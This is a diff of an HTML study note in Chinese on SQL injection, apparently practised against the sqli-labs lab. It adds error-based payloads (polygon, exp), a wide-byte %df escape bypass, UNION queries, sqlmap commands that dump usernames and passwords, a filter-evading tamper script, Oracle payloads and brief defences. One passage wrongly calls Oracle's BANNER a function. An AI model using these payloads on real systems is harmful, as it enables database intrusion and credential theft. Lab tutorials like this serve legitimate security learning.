 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102214772.png" alt="image-20231224102214772"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/e3b9d9b17dc7488792de7e9af790374a.png" alt="img">    </p>
+<h5 id="6-polygon报错注入"><a href="#6-polygon报错注入" class="headerlink" title="6.polygon报错注入"></a>6.polygon报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102240751.png" alt="image-20231224102240751"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/5cbe6dc8c3fb4378a5009ee5ca0f1ba9.png" alt="img">    </p>
+<h5 id="7-multipolygon报错注入"><a href="#7-multipolygon报错注入" class="headerlink" title="7.multipolygon报错注入"></a>7.multipolygon报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102308793.png" alt="image-20231224102308793"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/13bc800adf0e4c6db905bb62c7066aa6.png" alt="img">    </p>
+<h5 id="8-linestring报错注入"><a href="#8-linestring报错注入" class="headerlink" title="8.linestring报错注入"></a>8.linestring报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102404855.png" alt="image-20231224102404855"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/bcc78f083f5a45f9980261479bf974a6.png" alt="img">    </p>
+<h5 id="9-multilinestring报错注入"><a href="#9-multilinestring报错注入" class="headerlink" title="9.multilinestring报错注入"></a>9.multilinestring报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102433978.png" alt="image-20231224102433978"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/55da9cbcc47148f386419818ec82b166.png" alt="img"></p>
+<h5 id="10-exp报错注入"><a href="#10-exp报错注入" class="headerlink" title="10.exp报错注入"></a>10.exp报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102504654.png" alt="image-20231224102504654"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/3aad1b75884c4256ad3fa54ed5d57d9c.png" alt="img">    </p>
 <h4 id="Postman与sql注入"><a href="#Postman与sql注入" class="headerlink" title="Postman与sql注入"></a>Postman与sql注入</h4><p>进入网站后如果需要使用网站功能进行sql注入可以使用postman进行协助</p>
 <p>进入网站之后直接键盘点击F12，打开开发者工具，选择网络</p>
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224104441076.png" alt="image-20231224104441076"></p>
@@ -986,6 +1378,77 @@ schemata表 - 存储所有数据库名
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+----------+</span><br><span class="line">| id | username |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | Dumb     |</span><br><span class="line">| 2  | Angelina |</span><br><span class="line">| 3  | Dummy    |</span><br><span class="line">| 4  | secure   |</span><br><span class="line">| 5  | stupid   |</span><br><span class="line">| 6  | superman |</span><br><span class="line">| 7  | batman   |</span><br><span class="line">| 8  | admin    |</span><br><span class="line">| 9  | admin1   |</span><br><span class="line">| 10 | admin2   |</span><br><span class="line">| 11 | admin3   |</span><br><span class="line">| 12 | dhakkan  |</span><br><span class="line">| 14 | admin4   |</span><br><span class="line">+----+----------+</span><br></pre></td></tr></table></figure>
 
 <p>表的数据就可以直观的展示出来了</p>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p> 原理：mysql在使用 GBK 编码的时候，会认为两个字符为一个汉字，			例如%aa%5c 就是一个汉字（前一个ascii码大于128才能到汉			字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将’ 转换			为 &#39;</p>
+<p>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：<br>        1、%df 吃掉 \ 具体的原因是 urlencode(‘) &#x3D; %5c%27，我们在%5c%27 前面添加%df，形<br>成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>        2、将&#39;中的\过滤掉，例如可以构造%**%5c%5c%27的情况，后面的%5c会被前面的%5c<br>给注释掉。这也是bypass的一种方法。<br>例子： Less-32，33，34，35，36，37 </p>
+<p>​		1.正常情况下GPC开启或者使用addslashes函数过滤GET或POST提交的参数时，我们测试输入的’，就会被转义为&#39;;<br>​       2.若存在宽字节注入，输入%df%27时，经过单引号的转义变成了%df%5c%27，之后再数据库查询语句进行GBK多字节编码，即一个中文占用两个字节，一个英文同样占用两个字节且在汉字编码范围内两个编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成汉字”運”,单引号逃逸出来，从而绕过转义造成注入漏洞</p>
+<p>MySQL在使用GBK编码时，两个字符组合，认为是一个汉字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	西欧字母符号，通过1个字节来表示。东亚字符通过至少两个字节来表示。GBK编码就是用两个字节来表示中文区字符的一个编码标准。</span><br><span class="line">	GBK编码依然采用双字节编码方案，其编码范围∶8140一FEFE(高字节从81到FE，低字节从40到FE)，剔除xx7F码位，共23940个码位。</span><br><span class="line">条件</span><br><span class="line">	后台使用GBK编码的时候，存在着看不见的ascii码转换为GBK编码的转换过程，可以使用宽字节注入。</span><br><span class="line">原理</span><br><span class="line">编码转换存在着单字符被合并的情形</span><br><span class="line">反斜杠对应url编码%5c，是单字节的。</span><br><span class="line">在%5c前再加入一个单字节字符%dd（范围可以是81到FE之间)，就成了%dd%5cI</span><br><span class="line">而当后端使用GBK编码的时候，会将合理的两个单字节ANSCII字符解析成一个双字节的GBK编码字符</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df’-&gt;%df’-&gt; %df%5c%27(%df%5c是一个汉字)-&gt;(汉字)‘-&gt;id=(汉字)’ and (可以注入)</span><br></pre></td></tr></table></figure>
+
+<p>实操：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.45/sqli/Less-32/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227193736656.png" alt="image-20231227193736656"></p>
+<p>输入1‘网页实际输出的却是1&#39;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p>试过各种后缀都无法正常报错，</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227194144122.png" alt="image-20231227194144122"></p>
+<p>这时候便可以用到%df</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227193958466.png" alt="image-20231227193958466"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=1%df&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227195143032.png" alt="image-20231227195143032"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=-1%df&#x27; union select 1,database(),3-- -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.45/sqli/Less-32/?id=-1%df%27%20union%20select%201,database(),3--%20-</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227201951425.png" alt="image-20231227201951425"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=-1%df&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227203539322.png" alt="image-20231227203539322"></p>
+<p>2.宽字节注入防御方法</p>
+<p>（1）使用utf-8，避免宽字节注入；<br>ps:不仅在gbk,韩文，日文等等都是快字节注入漏洞</p>
+<p>（2）mysql_real_escape_string,mysql_set_charset(‘gbk,conn′);3.可以设置参数，charactersetclient&#x3D;binary只需在该语句中插入conn’);</p>
+<p>（3）可以设置参数，character_set_client&#x3D;binary只需在该语句中插入conn′);3.可以设置参数，charactersetclient&#x3D;binary只需在该语句中插入result&#x3D;mysql_query($sql)即可<br>result&#x3D;mysqlquery(“charactersetclient&#x3D;binary”,result&#x3D;mysql_query(“character_set_client&#x3D;binary”,result&#x3D;mysqlquery(“charactersetclient&#x3D;binary”,sql);&#x2F;&#x2F;就不会出现宽字节注入</p>
+<h5 id="宽字节与sqlmap"><a href="#宽字节与sqlmap" class="headerlink" title="宽字节与sqlmap"></a>宽字节与sqlmap</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1”</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df”</span><br><span class="line">python sqlmap.py -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” --current-user</span><br><span class="line">python sqlmap.py -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” --current-db（查数据库）</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” -D security --tables(当前数据库有哪些表)</span><br><span class="line"></span><br><span class="line">(当前表中有哪些字段)</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” -D security -T users --column</span><br><span class="line"></span><br><span class="line">(当前表中有哪些数据)</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” -D security -T users -C username,password --dump（使用dump来获取内容）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="其他注入sql演示"><a href="#其他注入sql演示" class="headerlink" title="其他注入sql演示"></a>其他注入sql演示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,(select concat(1,2,3)),3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227204444058.png" alt="image-20231227204444058"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select 4,5,6;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227205052633.png" alt="image-20231227205052633"></p>
+<p>参数重复注入，网站选择情况</p>
+<p><img src="/9.1-sql%E6%B3%A8%E5%85%A5.assets/image-20231227144128736.png" alt="image-20231227144128736"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.45/sqli/Less-1/?id=1&amp;id=2&amp;id=3&amp;id=4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227205323912.png" alt="image-20231227205323912"></p>
+<p>php表示默认选择最后的参数。</p>
+<h5 id="sqlmap的tamper编写"><a href="#sqlmap的tamper编写" class="headerlink" title="sqlmap的tamper编写"></a>sqlmap的tamper编写</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload= payload.lower()</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;or&#x27;</span> , <span class="string">&#x27;oorr&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;and&#x27;</span> , <span class="string">&#x27;anandd&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27; &#x27;</span> , <span class="string">&#x27;%0B&#x27;</span>)</span><br><span class="line">    retVal=payload</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<p>将该temper文件拖进kali中，放在&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-v 3 --tamper=trrr --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/45adb2ac02c9d623f7d0447188f2301.png" alt="45adb2ac02c9d623f7d0447188f2301"></p>
+<p>成功显示</p>
+<h4 id="Oracle数据库sql注入"><a href="#Oracle数据库sql注入" class="headerlink" title="Oracle数据库sql注入"></a>Oracle数据库sql注入</h4><p>空格需要使用+代替</p>
+<p>Oracle数据库注入时的字符需要有三个字符如abc，def</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union+select+&#x27;abc&#x27;,+&#x27;def&#x27;+from+xxxx</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT+BANNER,+NULL+FROM+v$version;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228160645883.png" alt="image-20231228160645883"></p>
+<p>Oracle没有数据库名的概念，所谓数据库名，即数据表的拥有者，也就是用户名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BANNER在Oracle数据库中是一条内置的SQL函数,它的功能是返回Oracle版本信息。</span><br><span class="line"></span><br><span class="line">具体来说:</span><br><span class="line"></span><br><span class="line">- BANNER是Oracle数据库提供的内置函数之一。</span><br><span class="line">- 当调用SELECT BANNER FROM DUAL时,它会返回Oracle数据库的版本信息。</span><br><span class="line">- 返回信息包含Oracle版本号、编译日期等详细信息。</span><br><span class="line">- 例如对于Oracle 11g,它可能返回:</span><br><span class="line"></span><br><span class="line">Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production</span><br><span class="line"> PL/SQL Release 11.2.0.4.0 - Production</span><br><span class="line"> &quot;CORE   11.2.0.4.0  Production&quot;</span><br><span class="line"> TNS for Linux: Version 11.2.0.4.0 - Production</span><br><span class="line"> NLSRTL Version 11.2.0.4.0 - Production</span><br><span class="line"></span><br><span class="line">- 通过BANNER可以快速获取Oracle数据库的详细版本信息。</span><br><span class="line">- 这对数据库管理和应用开发都很有帮助。</span><br><span class="line"></span><br><span class="line">所以总结来说,BANNER是Oracle内置函数,用于返回数据库版本的详细Banner信息,是常用的Oracle信息获取函数之一。</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="重要语句"><a href="#重要语句" class="headerlink" title="重要语句"></a>重要语句</h2><p>?id&#x3D;1</p>
 <p>?id&#x3D;1’– -</p>
 <p>?id&#x3D;1’order by 3– -</p>
